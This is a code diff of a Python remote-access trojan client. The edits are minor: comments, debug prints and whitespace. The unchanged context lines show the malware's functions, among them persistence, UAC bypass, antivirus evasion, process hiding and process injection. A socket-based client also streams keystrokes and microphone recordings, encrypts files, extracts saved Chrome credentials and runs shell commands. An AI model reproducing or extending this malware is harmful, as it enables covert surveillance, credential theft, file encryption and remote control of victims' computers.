@@ -874,7 +874,7 @@ import win32process
 import win32con
 import win32clipboard
 import win32gui
-from ctypes import wintypes
+
 # import browser_cookie3
 
 # Configuration
@@ -905,6 +905,7 @@ def add_persistence():
                 shutil.copy2(exe_path, target_path)
 
         except Exception as e:
+            # print(f"Persistence Error: {e}")
             pass
 
         
@@ -941,6 +942,7 @@ def bypass_uac():
                 f.write(data)
 
         except Exception as e:
+            print(f"Bypass UAC Error: {e}")
             pass
 
 def evade_antivirus():
@@ -977,6 +979,7 @@ def evade_antivirus():
             time.sleep(10)
 
         except Exception as e:
+            print(f"Evade Antivirus Error: {e}")
             pass
 
 def hide_process():
@@ -991,8 +994,8 @@ def hide_process():
             # print("Process hidden from Task Manager.")
         
         except Exception as e:
+            # print(f"Error hiding process: {str(e)}")
             pass
-
 
 def inject_into_process(target_process_name=None):
     if %s:
@@ -1060,7 +1063,6 @@ def inject_into_process(target_process_name=None):
         except Exception as e:
             pass
 
-
 class ClientAPP:
     def __init__(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1108,7 +1110,6 @@ class ClientAPP:
                 return False
             print('Onprees Function is on')
             try:
-                # Format key press
                 if hasattr(key, 'char'):
                     key_str = key.char
                 elif hasattr(key, 'name'):
@@ -1116,7 +1117,6 @@ class ClientAPP:
                 else:
                     key_str = str(key)
 
-                # Send immediately instead of buffering
                 try:
                     self.socket.send(f"KEYLOG:{key_str}".encode())
                     print(f'Key: {key_str} sent')
@@ -1268,35 +1268,42 @@ class ClientAPP:
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue
             
+            
     def record_audio(self, duration=60):
         try:
             CHANNELS = 1
-            SAMPLE_RATE = 48000
-            DTYPE = np.int16
+            SAMPLE_RATE = 48000  # Higher sample rate for better quality
+            DTYPE = np.int16  # Ensure the format matches WAV requirements
 
             audio_buffer = []
 
+            # Callback function to capture audio data
             def callback(indata, frames, time, status):
+                # Convert float32 to int16 to match WAV format
                 audio_buffer.append((indata * 32767).astype(DTYPE))
 
+            # Open the input stream
             with sd.InputStream(
                 channels=CHANNELS,
                 samplerate=SAMPLE_RATE,
-                dtype='float32',
+                dtype='float32',  # Use float32 for capture, convert later
                 blocksize=2048,
                 callback=callback
             ):
                 sd.sleep(int(duration * 1000))
 
+            # Concatenate audio buffer
             audio_data = np.concatenate(audio_buffer)
 
+            # Create a WAV file in memory
             buffer = io.BytesIO()
             with wave.open(buffer, 'wb') as wav:
                 wav.setnchannels(CHANNELS)
-                wav.setsampwidth(2)
+                wav.setsampwidth(2)  # 2 bytes for int16
                 wav.setframerate(SAMPLE_RATE)
                 wav.writeframes(audio_data.tobytes())
 
+            # Send the audio data
             audio_bytes = buffer.getvalue()
             self.socket.send(struct.pack('L', len(audio_bytes)))
             self.socket.send(audio_bytes)
@@ -1305,6 +1312,7 @@ class ClientAPP:
             error_msg = f"Audio recording error: {str(e)}"
             self.socket.send(struct.pack('L', len(error_msg.encode())))
             self.socket.send(error_msg.encode())
+
 
     def encrypt_files(self, path):
         try:
@@ -1426,7 +1434,7 @@ class ClientAPP:
                     chrome_creds.append({
                         'url': row[0],
                         'username': row[1],
-                        'password': row[2]
+                        'password': row[2]  # Note: Encrypted data
                     })
                 browser_data['chrome'] = chrome_creds
                 conn.close()
@@ -1569,7 +1577,7 @@ class ClientAPP:
                             continue
                         except FileNotFoundError:
                             self.socket.send('FOLDER_ERROR'.encode())
-                            continue                    
+                            continue
                     try:
                         process = subprocess.Popen(
                             command,
